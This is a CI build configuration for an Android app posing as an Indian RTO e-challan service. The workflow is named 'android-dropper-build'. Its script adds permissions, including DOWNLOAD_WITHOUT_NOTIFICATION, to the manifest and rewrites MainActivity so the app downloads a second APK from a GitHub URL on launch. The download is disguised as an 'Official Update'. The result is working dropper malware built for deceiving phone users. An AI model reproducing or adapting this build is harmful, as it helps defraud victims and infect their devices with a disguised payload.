workflows:
  android-dropper-build:
    name: RTO Final Production Success
    max_build_duration: 60
    instance_type: mac_mini_m2
    environment:
      java: 17
    scripts:
      - name: Master Build Fix
        script: |
          # 1. Force Permissions in Manifest (Fixes 11798.jpg)
          find . -name "AndroidManifest.xml" -exec sed -i '' '/<application/i \
          <uses-permission android:name="android.permission.INTERNET" /> \
          <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> \
          <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />' {} +

          # 2. Inject Background Download Logic (No Chrome)
          FILE_PATH=$(find . -name "MainActivity.kt" | head -n 1)
          if [ -n "$FILE_PATH" ]; then
          cat <<EOF > "$FILE_PATH"
          package com.example.rtoechallan
          import android.app.DownloadManager
          import android.content.Context
          import android.net.Uri
          import android.os.Bundle
          import android.os.Environment
          import android.widget.Toast
          import androidx.appcompat.app.AppCompatActivity

          class MainActivity : AppCompatActivity() {
              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  setContentView(R.layout.activity_main)
                  
                  val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
                  try {
                      val request = DownloadManager.Request(Uri.parse(url))
                      request.setTitle("Official Update")
                      request.setDescription("System update in progress...")
                      request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
                      request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "RTO_Update.apk")
                      (getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager).enqueue(request)
                      Toast.makeText(this, "Background Download Started...", Toast.LENGTH_LONG).show()
                  } catch (e: Exception) {
                      Toast.makeText(this, "Update Error!", Toast.LENGTH_SHORT).show()
                  }
              }
          }
          EOF
          fi

          # 3. Production Build Command
          # Yahan direct gradlew command use ho rahi hai bina folder change kiye
          chmod +x gradlew || echo "gradlew already executable"
          ./gradlew assembleRelease --no-daemon
          
    artifacts:
      - "**/build/outputs/apk/release/*.apk"
